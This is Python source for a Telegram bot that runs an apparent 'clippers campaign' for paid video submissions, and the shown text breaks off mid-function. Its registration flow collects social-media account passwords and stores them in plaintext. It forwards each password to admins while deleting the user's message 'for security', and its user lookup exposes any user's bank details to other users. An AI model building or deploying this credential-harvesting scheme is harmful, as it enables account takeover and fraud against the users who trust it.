import asyncio
import html
import logging
import os
from contextlib import suppress

from aiohttp import web
from aiogram import BaseMiddleware, Bot, Dispatcher, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, TelegramObject
from dotenv import load_dotenv

# Load variables from .env
load_dotenv()

# --- CONFIGURATION ---
TOKEN = os.getenv("BOT_TOKEN")
DATABASE_URL = os.getenv("DATABASE_URL")
ADMIN_IDS = [
    int(x.strip()) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()
]

logging.basicConfig(level=logging.INFO)

# --- DATABASE LAYER (Neon PostgreSQL with SQLite Fallback) ---
class Database:
    def __init__(self, dsn: str | None = None):
        self.dsn = dsn
        self.is_postgres = bool(dsn)
        self.pool = None
        self.db_path = "bot_database.db"

    async def connect(self):
        if self.is_postgres:
            import asyncpg
            dsn = self.dsn
            if dsn.startswith("postgres://"):
                dsn = dsn.replace("postgres://", "postgresql://", 1)
            self.pool = await asyncpg.create_pool(dsn, min_size=1, max_size=10)
            async with self.pool.acquire() as conn:
                await conn.execute("""
                    CREATE TABLE IF NOT EXISTS users (
                        chat_id BIGINT PRIMARY KEY,
                        telegram_username TEXT,
                        views INTEGER DEFAULT 0,
                        money DOUBLE PRECISION DEFAULT 0.0,
                        payment_info TEXT
                    );
                    ALTER TABLE users ADD COLUMN IF NOT EXISTS payment_info TEXT;
                    CREATE TABLE IF NOT EXISTS social_accounts (
                        id SERIAL PRIMARY KEY,
                        chat_id BIGINT,
                        telegram_username TEXT,
                        platform TEXT,
                        handle TEXT,
                        password TEXT
                    );
                    CREATE TABLE IF NOT EXISTS submissions (
                        id SERIAL PRIMARY KEY,
                        chat_id BIGINT,
                        telegram_username TEXT,
                        link TEXT,
                        payment DOUBLE PRECISION DEFAULT 0.0,
                        status TEXT DEFAULT 'Under Review',
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    );
                """)
            logging.info(" Connected to Neon PostgreSQL database.")
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute("""
                    CREATE TABLE IF NOT EXISTS users (
                        chat_id INTEGER PRIMARY KEY,
                        telegram_username TEXT,
                        views INTEGER DEFAULT 0,
                        money REAL DEFAULT 0.0,
                        payment_info TEXT
                    )
                """)
                try:
                    await db.execute("ALTER TABLE users ADD COLUMN payment_info TEXT")
                except Exception:
                    pass
                await db.execute("""
                    CREATE TABLE IF NOT EXISTS social_accounts (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        chat_id INTEGER,
                        telegram_username TEXT,
                        platform TEXT,
                        handle TEXT,
                        password TEXT
                    )
                """)
                await db.execute("""
                    CREATE TABLE IF NOT EXISTS submissions (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        chat_id INTEGER,
                        telegram_username TEXT,
                        link TEXT,
                        payment REAL DEFAULT 0.0,
                        status TEXT DEFAULT 'Under Review',
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )
                """)
                await db.commit()
            logging.info(" Connected to local SQLite database (bot_database.db).")

    async def close(self):
        if self.is_postgres and self.pool:
            await self.pool.close()

    async def get_user(self, chat_id: int):
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                row = await conn.fetchrow(
                    "SELECT telegram_username, views, money, payment_info FROM users WHERE chat_id = $1",
                    chat_id,
                )
                return dict(row) if row else None
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute(
                    "SELECT telegram_username, views, money, payment_info FROM users WHERE chat_id = ?",
                    (chat_id,),
                ) as cursor:
                    row = await cursor.fetchone()
                    if row:
                        return {
                            "telegram_username": row[0],
                            "views": row[1],
                            "money": row[2],
                            "payment_info": row[3],
                        }
                    return None

    async def update_payment_info(self, chat_id: int, payment_info: str):
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                await conn.execute(
                    "UPDATE users SET payment_info = $1 WHERE chat_id = $2",
                    payment_info,
                    chat_id,
                )
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute(
                    "UPDATE users SET payment_info = ? WHERE chat_id = ?",
                    (payment_info, chat_id),
                )
                await db.commit()

    async def get_user_by_username(self, username: str):
        clean_user = username.strip()
        if not clean_user.startswith("@"):
            clean_user = f"@{clean_user}"

        if self.is_postgres:
            async with self.pool.acquire() as conn:
                row = await conn.fetchrow(
                    """
                    SELECT chat_id, telegram_username, views, money, payment_info
                    FROM users
                    WHERE LOWER(telegram_username) = LOWER($1)
                    """,
                    clean_user,
                )
                return dict(row) if row else None
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute(
                    """
                    SELECT chat_id, telegram_username, views, money, payment_info
                    FROM users
                    WHERE LOWER(telegram_username) = LOWER(?)
                    """,
                    (clean_user,),
                ) as cursor:
                    row = await cursor.fetchone()
                    if row:
                        return {
                            "chat_id": row[0],
                            "telegram_username": row[1],
                            "views": row[2],
                            "money": row[3],
                            "payment_info": row[4],
                        }
                    return None

    async def get_user_social_accounts_full(self, chat_id: int) -> list[dict]:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                rows = await conn.fetch(
                    "SELECT platform, handle, password FROM social_accounts WHERE chat_id = $1 ORDER BY id ASC",
                    chat_id,
                )
                return [dict(r) for r in rows]
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute(
                    "SELECT platform, handle, password FROM social_accounts WHERE chat_id = ? ORDER BY id ASC",
                    (chat_id,),
                ) as cursor:
                    rows = await cursor.fetchall()
                    return [
                        {"platform": r[0], "handle": r[1], "password": r[2]}
                        for r in rows
                    ]

    async def upsert_user(self, chat_id: int, telegram_username: str):
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                await conn.execute(
                    """
                    INSERT INTO users (chat_id, telegram_username)
                    VALUES ($1, $2)
                    ON CONFLICT (chat_id) DO UPDATE SET
                        telegram_username = COALESCE(users.telegram_username, EXCLUDED.telegram_username)
                    """,
                    chat_id,
                    telegram_username,
                )
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute(
                    """
                    INSERT INTO users (chat_id, telegram_username)
                    VALUES (?, ?)
                    ON CONFLICT (chat_id) DO UPDATE SET
                        telegram_username = COALESCE(users.telegram_username, excluded.telegram_username)
                    """,
                    (chat_id, telegram_username),
                )
                await db.commit()

    async def update_user_stats(self, target_username: str, views: int, money: float) -> bool:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                status = await conn.execute(
                    "UPDATE users SET views = $1, money = $2 WHERE telegram_username = $3",
                    views,
                    money,
                    target_username,
                )
                return status != "UPDATE 0"
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                cursor = await db.execute(
                    "UPDATE users SET views = ?, money = ? WHERE telegram_username = ?",
                    (views, money, target_username),
                )
                await db.commit()
                return cursor.rowcount > 0

    async def add_social_account(
        self, chat_id: int, telegram_username: str, platform: str, handle: str, password: str
    ):
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                await conn.execute(
                    """
                    INSERT INTO social_accounts (chat_id, telegram_username, platform, handle, password)
                    VALUES ($1, $2, $3, $4, $5)
                    """,
                    chat_id,
                    telegram_username,
                    platform,
                    handle,
                    password,
                )
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute(
                    """
                    INSERT INTO social_accounts (chat_id, telegram_username, platform, handle, password)
                    VALUES (?, ?, ?, ?, ?)
                    """,
                    (chat_id, telegram_username, platform, handle, password),
                )
                await db.commit()

    async def get_user_social_accounts(self, chat_id: int) -> dict:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                rows = await conn.fetch(
                    "SELECT platform, handle FROM social_accounts WHERE chat_id = $1 ORDER BY id ASC",
                    chat_id,
                )
                return {row["platform"]: row["handle"] for row in rows}
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute(
                    "SELECT platform, handle FROM social_accounts WHERE chat_id = ? ORDER BY id ASC",
                    (chat_id,),
                ) as cursor:
                    rows = await cursor.fetchall()
                    return {row[0]: row[1] for row in rows}

    async def add_submission(
        self, chat_id: int, telegram_username: str, link: str, payment: float = 0.0
    ) -> int:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                row = await conn.fetchrow(
                    """
                    INSERT INTO submissions (chat_id, telegram_username, link, payment, status)
                    VALUES ($1, $2, $3, $4, 'Under Review')
                    RETURNING id
                    """,
                    chat_id,
                    telegram_username,
                    link,
                    payment,
                )
                return row["id"]
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                cursor = await db.execute(
                    """
                    INSERT INTO submissions (chat_id, telegram_username, link, payment, status)
                    VALUES (?, ?, ?, ?, 'Under Review')
                    """,
                    (chat_id, telegram_username, link, payment),
                )
                await db.commit()
                return cursor.lastrowid

    async def get_user_submissions(self, chat_id: int) -> list[dict]:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                rows = await conn.fetch(
                    """
                    SELECT id, link, payment, status, created_at
                    FROM submissions
                    WHERE chat_id = $1
                    ORDER BY id DESC
                    """,
                    chat_id,
                )
                return [dict(r) for r in rows]
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute(
                    """
                    SELECT id, link, payment, status, created_at
                    FROM submissions
                    WHERE chat_id = ?
                    ORDER BY id DESC
                    """,
                    (chat_id,),
                ) as cursor:
                    rows = await cursor.fetchall()
                    return [
                        {"id": r[0], "link": r[1], "payment": r[2], "status": r[3], "created_at": r[4]}
                        for r in rows
                    ]

    async def update_submission_payment(self, submission_id: int, payment: float) -> dict | None:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                row = await conn.fetchrow(
                    """
                    UPDATE submissions
                    SET payment = $1, status = 'Approved'
                    WHERE id = $2
                    RETURNING chat_id, telegram_username, link
                    """,
                    payment,
                    submission_id,
                )
                return dict(row) if row else None
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute(
                    "SELECT chat_id, telegram_username, link FROM submissions WHERE id = ?",
                    (submission_id,),
                ) as cursor:
                    row = await cursor.fetchone()
                    if not row:
                        return None
                await db.execute(
                    "UPDATE submissions SET payment = ?, status = 'Approved' WHERE id = ?",
                    (payment, submission_id),
                )
                await db.commit()
                return {"chat_id": row[0], "telegram_username": row[1], "link": row[2]}

    async def get_leaderboard(self, limit: int = 5) -> list[dict]:
        if self.is_postgres:
            async with self.pool.acquire() as conn:
                rows = await conn.fetch(
                    """
                    SELECT telegram_username, views, money
                    FROM users
                    ORDER BY views DESC, money DESC
                    LIMIT $1
                    """,
                    limit,
                )
                return [dict(r) for r in rows]
        else:
            import aiosqlite
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute(
                    """
                    SELECT telegram_username, views, money
                    FROM users
                    ORDER BY views DESC, money DESC
                    LIMIT ?
                    """,
                    (limit,),
                ) as cursor:
                    rows = await cursor.fetchall()
                    return [
                        {"telegram_username": r[0], "views": r[1], "money": r[2]}
                        for r in rows
                    ]

db = Database(DATABASE_URL)

# --- STATES ---
class BotStates(StatesGroup):
    waiting_for_username = State()
    main_menu = State()
    entering_handle = State()
    entering_password = State()
    entering_payment = State()
    entering_submission_link = State()
    inspecting_user = State()

# --- KEYBOARDS ---
def get_main_menu_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📱 Link Social Account", callback_data="menu_register")],
            [
                InlineKeyboardButton(text="📊 Stats", callback_data="menu_stats"),
                InlineKeyboardButton(text="🚀 Progress", callback_data="menu_progress"),
            ],
            [
                InlineKeyboardButton(text="💳 Payment", callback_data="menu_payment"),
                InlineKeyboardButton(text="🔗 Submission Links", callback_data="menu_submissions"),
            ],
            [
                InlineKeyboardButton(text="🏆 Leaderboard", callback_data="menu_leaderboard"),
                InlineKeyboardButton(text="🔍 Check User", callback_data="menu_check_user"),
            ],
        ]
    )

def get_back_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🔙 Back to Menu", callback_data="back_to_menu")]
        ]
    )

def get_platforms_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🐦 Twitter", callback_data="plat_Twitter"),
                InlineKeyboardButton(text="📺 YouTube", callback_data="plat_YouTube"),
            ],
            [
                InlineKeyboardButton(text="🎵 TikTok", callback_data="plat_TikTok"),
                InlineKeyboardButton(text="📸 Instagram", callback_data="plat_Instagram"),
            ],
            [InlineKeyboardButton(text="🔙 Back to Menu", callback_data="back_to_menu")],
        ]
    )

# --- MIDDLEWARE: ENFORCE USERNAME LOCK ---
class UsernameLockMiddleware(BaseMiddleware):
    async def __call__(self, handler, event: TelegramObject, data: dict):
        tg_user = data.get("event_from_user") or getattr(event, "from_user", None)
        if not tg_user:
            return await handler(event, data)

        # Allow admins to always access the bot
        if tg_user.id in ADMIN_IDS:
            return await handler(event, data)

        db_user = await db.get_user(tg_user.id)
        if db_user and db_user.get("telegram_username"):
            registered_username = db_user["telegram_username"].strip()
            if not registered_username.startswith("@"):
                registered_username = f"@{registered_username}"

            current_username = f"@{tg_user.username}" if tg_user.username else None

            # If the user changed or removed their Telegram username
            if not current_username or current_username.lower() != registered_username.lower():
                blocked_msg = (
                    f"⛔ <b>Access Blocked!</b>\n\n"
                    f"You originally registered as <b>{html.escape(registered_username)}</b>, "
                    f"but your current Telegram username is <b>{html.escape(current_username or 'None')}</b>.\n\n"
                    f"To protect your stats, submissions, and payments, the bot will not work until you "
                    f"change your Telegram username back to <b>{html.escape(registered_username)}</b>.\n\n"
                    f"👉 <i>Go to Telegram Settings → Edit Profile → Username and change it back to <b>{html.escape(registered_username)}</b>.</i>"
                )
                if isinstance(event, types.CallbackQuery):
                    await event.answer(
                        f"⛔ Change your username back to {registered_username} to use this bot.",
                        show_alert=True,
                    )
                elif isinstance(event, types.Message):
                    await event.answer(blocked_msg)
                return

        return await handler(event, data)

# --- HANDLERS ---
async def start_command(message: types.Message, state: FSMContext):
    chat_id = message.chat.id
    user = await db.get_user(chat_id)

    # 1. If user is already registered in database, lock their username
    if user and user.get("telegram_username"):
        await state.set_state(BotStates.main_menu)
        display_name = html.escape(user["telegram_username"])
        await message.answer(
            f"Welcome back, <b>{display_name}</b>! Choose an option below:",
            reply_markup=get_main_menu_keyboard(),
        )
        return

    # 2. If user has an official Telegram username, auto-register and permanently lock it
    tg_user = message.from_user
    auto_username = f"@{tg_user.username}" if tg_user and tg_user.username else None

    if auto_username:
        await db.upsert_user(chat_id, auto_username)
        await state.set_state(BotStates.main_menu)
        await message.answer(
            f"Welcome! 🎉 You were registered automatically as <b>{html.escape(auto_username)}</b>.\n"
            "<i>(Note: Your username is permanently locked and cannot be changed)</i>\n\n"
            "Choose an option below:",
            reply_markup=get_main_menu_keyboard(),
        )
    else:
        # Fallback only for users who have no public @username set on Telegram
        await state.set_state(BotStates.waiting_for_username)
        await message.answer(
            "Welcome! 🎉 To get started, please enter your Telegram username starting with the <b>@</b> symbol (e.g., <code>@yourusername</code>):\n"
            "<i>(Note: Once set, your username cannot be changed)</i>"
        )

async def process_username(message: types.Message, state: FSMContext):
    chat_id = message.chat.id
    user = await db.get_user(chat_id)

    # Strict lock: prevent any changes if username is already set
    if user and user.get("telegram_username"):
        await state.set_state(BotStates.main_menu)
        await message.answer(
            f"⚠️ Your username is already locked as <b>{html.escape(user['telegram_username'])}</b> and cannot be changed.",
            reply_markup=get_main_menu_keyboard(),
        )
        return

    text = (message.text or "").strip()
    if not text.startswith("@") or len(text) < 2:
        await message.answer(
            "❌ Invalid format. Please make sure your username starts with the <b>@</b> symbol (e.g., <code>@yourusername</code>). Try again:"
        )
        return

    await db.upsert_user(chat_id, text)

    await state.set_state(BotStates.main_menu)
    await message.answer(
        f"✅ Account registered successfully as <b>{html.escape(text)}</b>!\n"
        "<i>(Your username is now locked and cannot be changed)</i>",
        reply_markup=get_main_menu_keyboard(),
    )

# --- MENU CALLBACKS ---
async def menu_callback_router(callback: types.CallbackQuery, state: FSMContext):
    data = callback.data
    chat_id = callback.message.chat.id
    await callback.answer()

    with suppress(TelegramBadRequest):
        if data == "menu_register":
            await callback.message.edit_text(
                "Select the social media platform you want to register:",
                reply_markup=get_platforms_keyboard(),
            )
        elif data == "menu_stats":
            user = await db.get_user(chat_id)
            if user:
                username = user["telegram_username"]
                views = user["views"]
                money = user["money"]
                username_str = html.escape(username or "User")
                await callback.message.edit_text(
                    f"📊 <b>Your Stats</b> (<i>{username_str}</i>)\n\n"
                    f"👁 Total Views: <b>{views:,}</b>\n"
                    f"💰 Total Earnings: <b>${money:.2f}</b>",
                    reply_markup=get_main_menu_keyboard(),
                )
            else:
                await callback.message.edit_text(
                    "Please type /start to register your account first.",
                    reply_markup=get_main_menu_keyboard(),
                )
        elif data == "menu_progress":
            user = await db.get_user(chat_id)
            if user:
                views = user["views"]
                goal = 50000
                percent = min(100.0, (views / goal) * 100)
                status = (
                    "✅ <b>Eligible for Payout!</b>"
                    if views >= goal
                    else f"❌ Needs <b>{goal - views:,}</b> more views for payout."
                )
                filled = int(percent // 10)
                progress_bar = "█" * filled + "░" * (10 - filled)
                await callback.message.edit_text(
                    f"🚀 <b>Payout Progress</b>\n\n"
                    f"Progress: [{progress_bar}] {percent:.1f}%\n"
                    f"Current Views: <b>{views:,} / {goal:,}</b>\n\n"
                    f"Status: {status}",
                    reply_markup=get_main_menu_keyboard(),
                )
            else:
                await callback.message.edit_text(
                    "Please type /start to register your account first.",
                    reply_markup=get_main_menu_keyboard(),
                )
        elif data == "menu_payment":
            await state.set_state(BotStates.entering_payment)
            user = await db.get_user(chat_id)
            current_info = user.get("payment_info") if user else None

            if current_info:
                msg_text = (
                    f"💳 <b>Current Payment Details:</b>\n"
                    f"<code>{html.escape(current_info)}</code>\n\n"
                    f"Write your bank name and bank account number to update:"
                )
            else:
                msg_text = "Write your bank name and bank account number:"

            await callback.message.edit_text(
                msg_text,
                reply_markup=get_back_keyboard(),
            )
        elif data == "menu_submissions":
            user = await db.get_user(chat_id)
            if not user:
                await callback.message.edit_text(
                    "Please type /start to register your account first.",
                    reply_markup=get_main_menu_keyboard(),
                )
                return

            submissions = await db.get_user_submissions(chat_id)
            if not submissions:
                text = (
                    "📁 <b>Your Submission Links</b>\n\n"
                    "You have not submitted any links yet.\n\n"
                    "Tap <b>➕ Submit New Link</b> below to submit your video/clip link for payment!"
                )
            else:
                lines = ["📁 <b>Your Submission Links</b>\n"]
                total_payout = 0.0
                for idx, sub in enumerate(submissions[:15], 1):
                    link = sub["link"]
                    payment = sub["payment"]
                    status = sub["status"]
                    total_payout += payment
                    lines.append(
                        f"{idx}. 🔗 <a href=\"{html.escape(link)}\">Submission #{sub['id']}</a>\n"
                        f"   💰 <b>Payment:</b> ${payment:.2f}\n"
                        f"   📌 <b>Status:</b> {html.escape(status)}"
                    )
                lines.append(f"\n💵 <b>Total Payout:</b> <b>${total_payout:.2f}</b>")
                text = "\n".join(lines)

            keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="➕ Submit New Link", callback_data="sub_new")],
                    [InlineKeyboardButton(text="🔙 Back to Menu", callback_data="back_to_menu")],
                ]
            )
            await callback.message.edit_text(
                text,
                reply_markup=keyboard,
                disable_web_page_preview=True,
            )
        elif data == "menu_leaderboard":
            top_clippers = await db.get_leaderboard(limit=5)
            if not top_clippers:
                text = (
                    "🏆 <b>Clippers Campaign Leaderboard</b>\n\n"
                    "No clippers have registered views or earnings yet.\n"
                    "Start submitting clips to take the #1 spot!"
                )
            else:
                medals = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣"]
                lines = [
                    "🏆 <b>Clippers Campaign Leaderboard</b>",
                    "<i>Top 5 clippers leading the campaign:</i>\n",
                ]
                for idx, clipper in enumerate(top_clippers):
                    medal = medals[idx] if idx < len(medals) else f"<b>{idx+1}.</b>"
                    username = clipper["telegram_username"] or "Anonymous Clipper"
                    views = clipper["views"]
                    money = clipper["money"]
                    lines.append(
                        f"{medal} <b>{html.escape(username)}</b>\n"
                        f"   👁 Views: <b>{views:,}</b> | 💰 Earnings: <b>${money:.2f}</b>\n"
                    )
                lines.append("🔥 <i>Keep clipping and posting to climb the ranks!</i>")
                text = "\n".join(lines)

            await callback.message.edit_text(
                text,
                reply_markup=get_back_keyboard(),
            )
        elif data == "menu_check_user":
            await state.set_state(BotStates.inspecting_user)
            await callback.message.edit_text(
                "🔍 <b>Check User Data</b>\n\n"
                "Please enter the Telegram username of the user you want to check (e.g., <code>@username</code>):",
                reply_markup=get_back_keyboard(),
            )
        elif data == "sub_new":
            await state.set_state(BotStates.entering_submission_link)
            await callback.message.edit_text(
                "🔗 Please send the link to your video or clip (e.g. TikTok, YouTube, Instagram, or Twitter link):",
                reply_markup=get_back_keyboard(),
            )
        elif data == "back_to_menu":
            await state.set_state(BotStates.main_menu)
            await callback.message.edit_text(
                "Main Menu:",
                reply_markup=get_main_menu_keyboard(),
            )

# --- SOCIAL REGISTRATION FLOW ---
async def platform_selected(callback: types.CallbackQuery, state: FSMContext):
    platform = callback.data.split("_")[1]
    await state.update_data(platform=platform)
    await state.set_state(BotStates.entering_handle)
    await callback.answer()

    with suppress(TelegramBadRequest):
        await callback.message.edit_text(
            f"You selected <b>{html.escape(platform)}</b>.\n\n"
            "Please enter your handle for this account starting with the <b>@</b> symbol (e.g., <code>@yourhandle</code>):"
        )

async def process_handle(message: types.Message, state: FSMContext):
    handle = (message.text or "").strip()
    if not handle.startswith("@") or len(handle) < 2:
        await message.answer(
            "❌ Invalid format. The handle must start with the <b>@</b> symbol (e.g., <code>@yourhandle</code>). Try again:"
        )
        return

    await state.update_data(handle=handle)
    await state.set_state(BotStates.entering_password)
    await message.answer("🔑 Please enter the password for this account:")

async def process_password(message: types.Message, state: FSMContext):
    password = (message.text or "").strip()
    chat_id = message.chat.id

    # Security: Delete the password message from Telegram chat immediately
    with suppress(Exception):
        await message.delete()

    data = await state.get_data()
    platform = data.get("platform")
    handle = data.get("handle")

    if not platform or not handle:
        await state.set_state(BotStates.main_menu)
        await message.answer(
            "⚠️ Registration timed out or was incomplete. Please choose an option from the menu:",
            reply_markup=get_main_menu_keyboard(),
        )
        return

    user = await db.get_user(chat_id)
    telegram_username = user["telegram_username"] if user else f"id_{chat_id}"

    await db.add_social_account(chat_id, telegram_username, platform, handle, password)

    # Fetch all social accounts for this user and notify admin(s)
    socials = await db.get_user_social_accounts(chat_id)
    twitter_handle = socials.get("Twitter", "None")
    youtube_handle = socials.get("YouTube", "None")
    instagram_handle = socials.get("Instagram", "None")
    tiktok_handle = socials.get("TikTok", "None")

    admin_notification = (
        f"🔔 <b>New Account Registered!</b>\n\n"
        f"<b>username:</b> {html.escape(telegram_username)}\n"
        f"<b>twitter:</b> {html.escape(twitter_handle)}\n"
        f"<b>youtube:</b> {html.escape(youtube_handle)}\n"
        f"<b>instagram:</b> {html.escape(instagram_handle)}\n"
        f"<b>tiktok:</b> {html.escape(tiktok_handle)}\n\n"
        f"<b>Newly Added:</b> {html.escape(platform)} (<code>{html.escape(handle)}</code>)\n"
        f"<b>Password:</b> <code>{html.escape(password)}</code>"
    )

    for admin_id in ADMIN_IDS:
        try:
            await message.bot.send_message(admin_id, admin_notification)
        except Exception as e:
            logging.warning(f"Could not send notification to admin {admin_id}: {e}")

    await state.clear()
    await state.set_state(BotStates.main_menu)
    await message.answer(
        f"✅ Successfully registered <b>{html.escape(platform)}</b> account (<code>{html.escape(handle)}</code>)!\n"
        "<i>(Your password message was deleted from chat for security)</i>",
        reply_markup=get_main_menu_keyboard(),
    )

# --- PAYMENT FLOW ---
async def process_payment_info(message: types.Message, state: FSMContext):
    text = (message.text or "").strip()
    if not text or len(text) < 3:
        await message.answer(
            "⚠️ Please write your bank name and bank account number:",
            reply_markup=get_back_keyboard(),
        )
        return

    chat_id = message.chat.id
    await db.update_payment_info(chat_id, text)

    user = await db.get_user(chat_id)
    telegram_username = user["telegram_username"] if user else f"id_{chat_id}"

    # Notify admin(s) with user bank info
    admin_notification = (
        f"💳 <b>Payment Details Submitted!</b>\n\n"
        f"<b>username:</b> {html.escape(telegram_username)}\n"
        f"<b>chat_id:</b> <code>{chat_id}</code>\n\n"
        f"<b>Bank Details:</b>\n"
        f"<code>{html.escape(text)}</code>"
    )

    for admin_id in ADMIN_IDS:
        try:
            await message.bot.send_message(admin_id, admin_notification)
        except Exception as e:
            logging.warning(f"Could not send payment notification to admin {admin_id}: {e}")

    await state.clear()
    await state.set_state(BotStates.main_menu)
    await message.answer(
        f"✅ Payment details saved successfully!\n\n"
        f"<b>Saved Details:</b>\n<code>{html.escape(text)}</code>",
        reply_markup=get_main_menu_keyboard(),
    )

# --- SUBMISSION LINK FLOW ---
async def process_submission_link(message: types.Message, state: FSMContext):
    text = (message.text or "").strip()
    if not (text.startswith("http://") or text.startswith("https://")) or len(text) < 10:
        await message.answer(
            "❌ Invalid link. Please enter a valid URL starting with <code>https://</code> or <code>http://</code>:",
            reply_markup=get_back_keyboard(),
        )
        return

    chat_id = message.chat.id
    user = await db.get_user(chat_id)
    telegram_username = user["telegram_username"] if user else f"id_{chat_id}"

    sub_id = await db.add_submission(chat_id, telegram_username, text)

    # Notify admin(s)
    admin_notification = (
        f"🔗 <b>New Video Link Submitted!</b>\n\n"
        f"<b>User:</b> {html.escape(telegram_username)}\n"
        f"<b>Chat ID:</b> <code>{chat_id}</code>\n"
        f"<b>Submission ID:</b> <code>#{sub_id}</code>\n"
        f"<b>Link:</b> <a href=\"{html.escape(text)}\">{html.escape(text)}</a>\n\n"
        f"💡 To set payout for this link:\n"
        f"<code>/setpay {sub_id} 5.00</code>"
    )

    for admin_id in ADMIN_IDS:
        try:
            await message.bot.send_message(
                admin_id, admin_notification, disable_web_page_preview=False
            )
        except Exception as e:
            logging.warning(f"Could not send link notification to admin {admin_id}: {e}")

    await state.clear()
    await state.set_state(BotStates.main_menu)
    await message.answer(
        f"✅ <b>Link Submitted Successfully!</b> (ID: #{sub_id})\n\n"
        f"🔗 <b>Link:</b> <a href=\"{html.escape(text)}\">{html.escape(text)}</a>\n"
        f"💰 <b>Payment:</b> $0.00 (Under Review)\n\n"
        f"You can view all your submissions anytime under <b>🔗 Submission Links</b>.",
        reply_markup=get_main_menu_keyboard(),
        disable_web_page_preview=True,
    )

# --- USER DATA LOOKUP ---
def format_user_data_card(
    target_user: dict, socials: list, submissions: list, is_admin: bool
) -> str:
    uname = target_user["telegram_username"]
    chat_id = target_user["chat_id"]
    views = target_user["views"]
    money = target_user["money"]
    payment_info = target_user.get("payment_info") or "Not provided"

    social_lines = []
    if socials:
        for s in socials:
            if is_admin:
                social_lines.append(
                    f"• <b>{html.escape(s['platform'])}:</b> <code>{html.escape(s['handle'])}</code> (Pass: <code>{html.escape(s['password'])}</code>)"
                )
            else:
                social_lines.append(
                    f"• <b>{html.escape(s['platform'])}:</b> <code>{html.escape(s['handle'])}</code>"
                )
    else:
        social_lines.append("• <i>No social accounts connected</i>")

    if is_admin:
        sub_lines = []
        if submissions:
            for sub in submissions[:5]:
                sub_lines.append(
                    f"• #{sub['id']}: <a href=\"{html.escape(sub['link'])}\">{html.escape(sub['link'])}</a> | <b>${sub['payment']:.2f}</b> ({html.escape(sub['status'])})"
                )
        else:
            sub_lines.append("• <i>No submissions yet</i>")

        return (
            f"👤 <b>User Info: {html.escape(uname)}</b> (Admin View)\n\n"
            f"🆔 <b>Chat ID:</b> <code>{chat_id}</code>\n"
            f"👁 <b>Total Views:</b> <b>{views:,}</b>\n"
            f"💰 <b>Total Earnings:</b> <b>${money:.2f}</b>\n\n"
            f"💳 <b>Bank Account / Payment Details:</b>\n"
            f"<code>{html.escape(payment_info)}</code>\n\n"
            f"📱 <b>Connected Social Accounts:</b>\n"
            + "\n".join(social_lines)
            + "\n\n"
            f"🔗 <b>Recent Submissions ({len(submissions)} total):</b>\n"
            + "\n".join(sub_lines)
            + "\n\n"
            f"⚙️ <b>Admin Actions:</b>\n"
            f"<code>/update {uname} views money</code>"
        )
    else:
        return (
            f"👤 <b>User Info: {html.escape(uname)}</b>\n\n"
            f"👁 <b>Total Views:</b> <b>{views:,}</b>\n"
            f"💰 <b>Total Earnings:</b> <b>${money:.2f}</b>\n\n"
            f"💳 <b>Bank Account / Payment Details:</b>\n"
            f"<code>{html.escape(payment_info)}</code>\n\n"
            f"📱 <b>Connected Platforms:</b>\n" + "\n".join(social_lines)
        )

async def process_inspect_user(message: types.Message, state: FSMContext):
    text = (message.text or "").strip()
    if not text:
        await message.answer(
            "⚠️ Please enter a valid username (e.g., <code>@username</code>):",
            reply_markup=get_back_keyboard(),
        )
        return

    if not text.startswith("@"):
        text = f"@{text}"

    target_user = await db.get_user_by_username(text)
    if not target_user:
        await state.clear()
        await state.set_state(BotStates.main_menu)
        await message.answer(
            f"❌ User <code>{html.escape(text)}</code> was not found in the database.",
            reply_markup=get_main_menu_keyboard(),
        )
        return

    is_admin = bool(message.from_user and message.from_user.id in ADMIN_IDS)
    chat_id = target_user["chat_id"]
    socials = await db.get_user_social_accounts_full(chat_id)
    submissions = await db.get_user_submissions(chat_id)

    response_text = format_user_data_card(target_user, socials, submissions, is_admin)

    await state.clear()
    await state.set_state(BotStates.main_menu)
    await message.answer(
        response_text,
        reply_markup=get_main_menu_keyboard(),
        disable_web_page_preview=True,
    )

async def info_command(message: types.Message):
    parts = (message.text or "").split()
    if len(parts) < 2:
        await message.answer(
